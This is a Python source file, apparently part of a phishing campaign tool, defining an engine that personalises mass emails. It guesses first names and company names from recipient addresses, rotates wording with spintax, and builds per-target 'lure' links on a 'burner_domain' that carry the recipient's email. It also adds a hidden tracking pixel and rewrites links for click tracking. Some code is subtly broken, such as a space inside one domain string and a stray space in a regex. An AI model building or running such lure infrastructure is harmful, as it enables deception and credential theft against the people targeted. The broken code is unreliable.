import re
import json
import random
import uuid
from datetime import datetime
from flask import url_for
from urllib.parse import urlparse, urlunparse

try:
    import css_inline
    CSS_INLINE_AVAILABLE = True
except ImportError:
    CSS_INLINE_AVAILABLE = False

COMMON_ISP_DOMAINS = {
    "gmail.com", "yahoo.com", "hotmail.com", "aol.com", "outlook.com",
    "msn.com", "live.com", "icloud.com", "mail.com", "comcast.net",
    "verizon.net", "att.net", "sbcglobal. net", "cox.net", "yandex.com",
    "protonmail.com", "zoho.com", "gmx.com", "fastmail.com", "hey.com",
    "tutanota.com", "riseup.net", "disroot.org"
}

GENERIC_EMAIL_WORDS = {
    'info', 'contact', 'admin', 'support', 'sales', 'mail', 'email',
    'hello', 'test', 'demo', 'user', 'customer', 'press', 'jobs',
    'careers', 'service', 'team', 'office', 'billing', 'accounts',
    'dev', 'webmaster', 'media', 'noreply', 'no-reply', 'marketing',
    'newsletter', 'updates', 'general', 'enquiry', 'staff', 'manager',
    'hr', 'recruitment', 'inquiries'
}


class PersonalizationEngine:
    def __init__(self, campaign, recipient):
        self.campaign = campaign
        self.recipient = recipient

    def _spin_text(self, text):
        if not text:
            return text
        pattern = re.compile(r'\{([^{}]*)\}')
        while True:
            match = pattern.search(text)
            if not match:
                break
            options = match.group(1).split('|')
            text = text[: match.start()] + random.choice(options) + text[match.end():]
        return text

    def _get_context(self):
        try:
            context = json.loads(self. recipient.data) if self.recipient. data else {}
        except json.JSONDecodeError:
            context = {}

        context = {k. lower(): v for k, v in context. items()}

        # AUTOGRAB:  Firstname
        if 'firstname' not in context or not context. get('firstname'):
            local_part = self. recipient.email.split('@')[0]
            potential_parts = re.split(r'[._\-+]+', local_part)
            valid_parts = [p for p in potential_parts if len(p) > 1 and p.isalpha()]

            if valid_parts and valid_parts[0]. lower() not in GENERIC_EMAIL_WORDS: 
                context['firstname'] = valid_parts[0]. capitalize()
            else:
                context['firstname'] = "there"

        # AUTOGRAB: Company
        if 'company' not in context or not context.get('company'):
            try:
                domain = self.recipient. email.split('@')[1]. lower()
                if domain in COMMON_ISP_DOMAINS:
                    context['company'] = "your company"
                else: 
                    parts = domain.split('.')
                    if len(parts) > 2 and len(parts[-2]) > 2 and parts[-2] not in ('co', 'com', 'org', 'net', 'gov', 'edu'):
                        company_part = parts[-2]
                    else:
                        company_part = parts[0]
                    context['company'] = company_part.capitalize()
            except Exception:
                context['company'] = "your company"

        # Dynamic greetings
        now = datetime.now()
        hour = now.hour
        if 5 <= hour < 12:
            base_greeting = "Good morning"
        elif 12 <= hour < 18:
            base_greeting = "Good afternoon"
        else: 
            base_greeting = "Good evening"

        firstname = context.get('firstname', 'there')
        context['greetings'] = f"{base_greeting} {firstname}"
        context['currentdate'] = now.strftime("%B %d, %Y")
        context['time'] = now.strftime("%I:%M %p")

        # Sender info
        if self.campaign.smtp_profile:
            context['sender_name'] = self. campaign.smtp_profile.sender_name or "Sender"
            context['sender_email'] = self. campaign.smtp_profile.sender_email or ""
        else: 
            context['sender_name'] = "Sender"
            context['sender_email'] = ""

        # Generate secure link
        context['secure_link'] = self._generate_secure_link()

        # Unsubscribe link
        try:
            unsubscribe_token = self.recipient.get_tracking_token('unsubscribe')
            context['unsubscribe_link'] = url_for('main.unsubscribe', token=unsubscribe_token, _external=True)
        except Exception:
            context['unsubscribe_link'] = "#"

        return context

    def _generate_secure_link(self):
        burner_domain = self.campaign. burner_domain
        lure_path = self.campaign. lure_path

        if not burner_domain: 
            return "#"

        parsed_domain = urlparse(burner_domain)
        if not parsed_domain. scheme: 
            burner_domain = "https://" + burner_domain
            parsed_domain = urlparse(burner_domain)

        nonce = str(uuid.uuid4())
        target_id = self.recipient.email
        clean_path = lure_path.lstrip('/') if lure_path else ""

        final_url = urlunparse((
            parsed_domain.scheme,
            parsed_domain.netloc,
            clean_path,
            '',
            f'id={target_id}&nonce={nonce}',
            ''
        ))
        return final_url

    def _render_template(self, template_string, context):
        if not template_string:
            return ""

        result = template_string

        # Replace legacy [placeholder] with {{placeholder}}
        result = re.sub(r'\[([a-zA-Z0-9_]+)\]', r'{{\1}}', result)

        # Replace {{placeholder}} with values
        for key, value in context.items():
            pattern = r'\{\{\s*' + re.escape(str(key)) + r'\s*\}\}'
            result = re.sub(pattern, str(value) if value else '', result, flags=re. IGNORECASE)

        # Remove any remaining unmatched placeholders
        result = re.sub(r'\{\{[^}]+\}\}', '', result)

        return result

    def _add_tracking_pixel(self, html_content):
        try:
            open_token = self.recipient. get_tracking_token('open')
            open_url = url_for('main.track_open', token=open_token, _external=True)
            pixel_img = f'<img src="{open_url}" width="1" height="1" alt="" border="0" style="height:1px;width:1px;border: 0;display:none;"/>'

            if '</body>' in html_content. lower():
                return re.sub(r'</body>', f'{pixel_img}</body>', html_content, flags=re. IGNORECASE)
            return html_content + pixel_img
        except Exception:
            return html_content

    def _replace_links_for_tracking(self, html_content):
        try:
            def replace_link(match):
                original_url = match.group(2)
                if any(x in original_url for x in ['mailto:', '#', 'unsubscribe', '/track/', 'nonce=']):
                    return match.group(0)

                try:
                    import base64
                    click_token = self.recipient.get_tracking_token('click', payload={'url': original_url})
                    tracked_url = url_for('main.track_click', token=click_token, _external=True)
                    return f'{match.group(1)}="{tracked_url}"'
                except Exception: 
                    return match.group(0)

            return re.sub(r'(href\s*=\s*)(["\'](https?://[^"\']+)["\'])', replace_link, html_content, flags=re. IGNORECASE)
        except Exception: 
            return html_content

    def _inline_css(self, html_content):
        if CSS_INLINE_AVAILABLE:
            try:
                inliner = css_inline.CSSInliner()
                return inliner.inline(html_content)
            except Exception: 
                pass
        return html_content

    def _html_to_plain(self, html):
        if not html:
            return ""
        text = re.sub(r'<(script|style).*?>.*?</\1>', '', html, flags=re.DOTALL | re.IGNORECASE)
        text = re.sub(r'</(p|h[1-6]|li|div|tr)\s*>', '\n', text, flags=re. IGNORECASE)
        text = re. sub(r'<br\s*/? >', '\n', text, flags=re. IGNORECASE)
        text = re.sub(r'<[^>]+>', ' ', text)
        text = re.sub(r'&nbsp;', ' ', text)
        text = re.sub(r'&amp;', '&', text)
        text = re.sub(r'&lt;', '<', text)
        text = re.sub(r'&gt;', '>', text)
        text = re.sub(r'\s+', ' ', text)
        lines = [line.strip() for line in text.split('\n')]
        return '\n'.join(line for line in lines if line)

    def personalize(self):
        context = self._get_context()

        # Get subject and body
        subject = self. campaign.subject or ""
        body_html = self.campaign. body_html or ""

        # Apply spintax
        subject = self._spin_text(subject)
        body_html = self._spin_text(body_html)

        # Render templates with context
        final_subject = self._render_template(subject, context)
        final_body_html = self._render_template(body_html, context)

        # Inline CSS
        final_body_html = self._inline_css(final_body_html)

        # Add tracking
        final_body_html = self._replace_links_for_tracking(final_body_html)
        final_body_html = self._add_tracking_pixel(final_body_html)

        # Generate plain text version
        final_body_plain = self._html_to_plain(final_body_html)

        return final_subject, final_body_html, final_body_plain
